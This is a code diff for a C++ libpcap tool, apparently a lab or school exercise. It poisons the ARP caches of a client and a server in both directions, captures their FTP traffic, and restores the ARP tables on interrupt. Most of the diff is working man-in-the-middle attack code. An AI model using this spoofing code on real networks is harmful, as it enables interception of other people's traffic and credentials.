@@ -67,12 +67,16 @@ struct tcp_header
     u_short urg_ptr;
 };
 
-void signalHandler(int signum)
-{
-    std::cout << "Interception du signal " << signum << ", restauration des tables ARP et sortie.\n";
-    // restoreArpTables();
-    exit(signum);
-}
+pcap_t *handle;
+
+uint8_t ip_address_client[4];
+uint8_t mac_address_client[6];
+
+uint8_t ip_address_server[4];
+uint8_t mac_address_server[6];
+
+uint8_t local_ip_address[4];
+uint8_t local_mac_address[6];
 
 void checkArgs(int argc, char **argv)
 {
@@ -180,7 +184,13 @@ void convertArgsServer(uint8_t *ip_address_server, uint8_t *mac_address_server, 
     std::cout << "mac addr client: " << mac_str << std::endl;
 }
 
-uint8_t *buildPacketARP(uint8_t *ip_address_client, uint8_t *mac_address_client, uint8_t *ip_address_server, uint8_t *mac_address_server, uint8_t *local_ip_address, uint8_t *local_mac_address)
+uint8_t *buildPacketARPSpoofing(
+    uint8_t *ip_address_client,
+    uint8_t *mac_address_client,
+    uint8_t *ip_address_server,
+    uint8_t *mac_address_server,
+    uint8_t *local_ip_address,
+    uint8_t *local_mac_address)
 {
     uint8_t *packet = new uint8_t[sizeof(eth_header) + sizeof(arp_packet)];
 
@@ -195,6 +205,47 @@ uint8_t *buildPacketARP(uint8_t *ip_address_client, uint8_t *mac_address_client,
     memcpy(arp.target_ip, ip_address_client, 4);
 
     memcpy(arp.sender_mac, local_mac_address, 6);
+    memcpy(arp.sender_ip, ip_address_server, 4);
+
+    eth_header eth = {
+        eth_type : htons(0x0806), // ARP 0x0806, IPv4 0x0800.
+    };
+    memcpy(eth.dest_mac, mac_address_client, 6);
+    memcpy(eth.src_mac, local_mac_address, 6);
+
+    // build packet
+    memcpy(packet, &eth, sizeof(eth_header));
+    memcpy(packet + sizeof(eth_header), &arp, sizeof(arp_packet));
+
+    if (packet == nullptr)
+    {
+        std::cerr << "Impossible de construire le paquet ARP.";
+        exit(1);
+    }
+    return packet;
+}
+
+uint8_t *buildPacketARPRestore(
+    uint8_t *ip_address_client,
+    uint8_t *mac_address_client,
+    uint8_t *ip_address_server,
+    uint8_t *mac_address_server,
+    uint8_t *local_ip_address,
+    uint8_t *local_mac_address)
+{
+    uint8_t *packet = new uint8_t[sizeof(eth_header) + sizeof(arp_packet)];
+
+    arp_packet arp = {
+        hw_type : htons(0x0001),    // Ethernet
+        proto_type : htons(0x0800), // IP
+        hw_len : 6,                 // MAC address length
+        proto_len : 4,              // IP address length
+        opcode : htons(2),          // ARP Request
+    };
+    memcpy(arp.target_mac, mac_address_client, 6);
+    memcpy(arp.target_ip, ip_address_client, 4);
+
+    memcpy(arp.sender_mac, mac_address_server, 6);
     memcpy(arp.sender_ip, ip_address_server, 4);
 
     eth_header eth = {
@@ -293,29 +344,32 @@ void periodicArpSpoofing(pcap_t *handle, uint8_t *packet)
     }
 }
 
-// g++ inquisitor.cpp -o inquisitor -lpcap -lpthread && ./inquisitor 172.20.0.2 02:42:ac:14:00:02 172.20.0.4 02:42:ac:14:00:04
+void signalHandler(int signum)
+{
+    std::cout << "Interception du signal " << signum << ", restauration des tables ARP et sortie.\n";
+    uint8_t *packetClient = buildPacketARPRestore(ip_address_client, mac_address_client, ip_address_server, mac_address_server, local_ip_address, local_mac_address);
+    uint8_t *packetServer = buildPacketARPRestore(ip_address_server, mac_address_server, ip_address_client, mac_address_client, local_ip_address, local_mac_address);
+
+    sendARPSpoofing(packetClient, handle);
+    sendARPSpoofing(packetServer, handle);
+
+    exit(signum);
+}
+
+// g++ inquisitor.cpp -o inquisitor -lpcap -lpthread && ./inquisitor 172.20.0.3 02:42:ac:14:00:03 172.20.0.4 02:42:ac:14:00:04
 int main(int argc, char *argv[])
 {
-    pcap_t *handle;
     char errbuf[PCAP_ERRBUF_SIZE];
 
     signal(SIGINT, signalHandler);
-
-    uint8_t ip_address_client[4];
-    uint8_t mac_address_client[6];
-
-    uint8_t ip_address_server[4];
-    uint8_t mac_address_server[6];
-
-    uint8_t local_ip_address[4];
-    uint8_t local_mac_address[6];
 
     const char *ipClient = argv[1];
     const char *macClient = argv[2];
     const char *ipServer = argv[3];
     const char *macServer = argv[4];
 
-    uint8_t *packet;
+    uint8_t *packetSpoofingClient = nullptr;
+    uint8_t *packetSpoofingServer = nullptr;
 
     checkArgs(argc, argv);
     convertArgsClient(ip_address_client, mac_address_client, ipClient, macClient);
@@ -334,14 +388,18 @@ int main(int argc, char *argv[])
         std::cout << "handle : " << handle << std::endl;
     }
 
-    packet = buildPacketARP(ip_address_client, mac_address_client, ip_address_server, mac_address_server, local_ip_address, local_mac_address);
+    packetSpoofingClient = buildPacketARPSpoofing(ip_address_client, mac_address_client, ip_address_server, mac_address_server, local_ip_address, local_mac_address);
+    packetSpoofingServer = buildPacketARPSpoofing(ip_address_server, mac_address_server, ip_address_client, mac_address_client, local_ip_address, local_mac_address);
+    std::thread arp_thread_client(periodicArpSpoofing, handle, packetSpoofingClient);
+    std::thread arp_thread_server(periodicArpSpoofing, handle, packetSpoofingServer);
 
-    std::thread arp_thread(periodicArpSpoofing, handle, packet);
     captureFtpPackets(handle);
 
-    arp_thread.join();
+    arp_thread_client.join();
+    arp_thread_server.join();
     pcap_close(handle);
-    delete[] packet;
+    delete[] packetSpoofingClient;
+    delete[] packetSpoofingServer;
 
     return 0;
 }
